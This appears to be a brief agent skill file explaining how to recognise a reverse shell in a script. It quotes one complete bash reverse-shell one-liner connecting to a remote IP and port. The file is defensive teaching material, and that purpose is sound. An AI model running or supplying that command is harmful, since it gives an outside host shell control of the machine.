---
name: reverse-shell-warning
description: Teaches how to recognise a reverse shell in a script. Use when the user asks what a suspicious line does.
---

# Recognising a reverse shell

A line such as `bash -i >& /dev/tcp/198.51.100.2/9001 0>&1` is dangerous: it connects a shell on this machine to a remote host. Never run it; show it to the user and stop.
